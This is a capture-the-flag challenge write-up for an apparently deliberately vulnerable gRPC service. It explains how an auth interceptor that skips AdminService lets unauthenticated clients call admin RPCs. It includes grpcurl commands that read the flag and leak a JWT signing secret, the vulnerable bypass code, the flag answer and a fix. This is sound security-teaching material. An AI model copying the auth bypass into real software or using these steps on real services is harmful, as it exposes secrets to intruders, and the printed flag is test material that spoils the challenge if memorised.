# Challenge 02 — Unauthenticated Admin Access

**Category:** Broken Access Control
**Difficulty:** 🟢 Easy
**Service:** `AdminService`
**Flag:** `FLAG{unauth_4dm1n_n0_t0k3n_n33d3d}`

---

## Background

The `AdminService` contains sensitive RPCs (get flags, leak system info, execute raw SQL) but the authentication interceptor **explicitly skips auth checks** for all `AdminService` routes. Any unauthenticated client can call these RPCs directly.

This is a common misconfiguration: developers add a service to a bypass list during development and forget to remove it.

---

## Objective

Call `AdminService.GetFlag` without any authentication token.

---

## Steps

```bash
# No token, no problem
grpcurl -plaintext localhost:50051 dvgrpc.AdminService/GetFlag \
  -d '{"challenge":"unauthenticated_admin"}'

# Bonus: Leak system info including the JWT signing secret
grpcurl -plaintext localhost:50051 dvgrpc.AdminService/GetSystemInfo

# Bonus: Dump ALL flags
grpcurl -plaintext localhost:50051 dvgrpc.AdminService/ListAllFlags
```

---

## Vulnerable Code

`server/interceptors/auth_interceptor.py`:

```python
# VULNERABILITY: Entire service is excluded from auth
if "/dvgrpc.AdminService/" in method:
    return continuation(handler_call_details)  # No auth check at all!
```

---

## Fix

```python
# Remove AdminService from bypass list
# Require auth AND admin role for all admin RPCs

ADMIN_METHODS = frozenset([
    "/dvgrpc.AdminService/GetFlag",
    "/dvgrpc.AdminService/GetSystemInfo",
    # ...
])

if method in ADMIN_METHODS:
    payload = verify_token(token)
    if payload is None or payload.get("role") != "admin":
        context.abort(PERMISSION_DENIED, "Admin role required")
```
